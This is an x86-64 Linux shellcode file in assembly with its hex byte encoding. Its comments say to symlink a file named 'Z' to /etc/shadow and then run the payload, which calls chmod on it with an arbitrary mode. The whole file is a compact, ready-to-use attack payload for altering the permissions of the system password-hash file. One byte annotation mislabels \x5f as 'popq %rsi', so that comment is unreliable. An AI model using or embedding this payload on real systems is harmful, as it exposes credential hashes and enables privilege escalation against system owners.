# Compile With: gcc -nostdlib -static -o chmod chmod.S or as -o chmod.o chmod.S ; ld -o chmod chmod.o
# Run for Example: ln -s /etc/shadow Z ; ./chmod
# Hex Version: "\x5e\x6a\x5a\x54\x5f\x58\x0f\x05"
#	\x5e	 -> popq %rsi
# 	\x6a\x5a -> pushq $0x5a
#	\x54	 -> pushq %rsp
#	\x5f	 -> popq %rsi
#	\x58	 -> popq %rax
#	\x0f\x05 -> syscall
#

.global _start
_start:
	popq %rsi	# set mode to random a value (top %rsp value)
	pushq $0x5a	# 5a linked file name and 'chmod' call number
	pushq %rsp	# create pointer for 5a
	popq %rdi	# set filename to 5a pointer
	popq %rax	# set call number
	syscall 	# call chmod -> chmod('Z', rsi)
